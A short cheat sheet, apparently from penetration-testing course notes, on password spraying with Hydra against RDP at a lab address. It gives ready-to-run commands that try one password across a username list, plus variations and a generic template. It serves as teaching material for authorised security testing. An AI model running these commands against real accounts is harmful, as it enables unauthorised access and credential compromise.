Hydra - Password Spraying

Concept

Password spraying uses one password against a list of usernames to avoid account lockouts and detect valid credentials.

Prepare username list

echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt

Basic RDP password spraying

hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202

Limit threads

hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" -t 4 rdp://192.168.50.202

Verbose output

hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" -vV rdp://192.168.50.202

Stop on first valid credential

hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" -f rdp://192.168.50.202

Reduce noise (custom username list)

# Create a smaller list with only targeted users
printf "daniel\njustin\n" > users.txt

hydra -L users.txt -p "SuperS3cure1337#" rdp://192.168.50.202

Generic syntax

hydra -L <USER_LIST> -p "<PASSWORD>" <PROTOCOL>://<IP>

Notes

  • Useful when a password is obtained from leaks or other sources.
  • Helps identify users who reuse passwords across systems.
  • Be careful with account lockouts and intrusion detection systems.
  • Large lists increase noise and may trigger defensive controls.
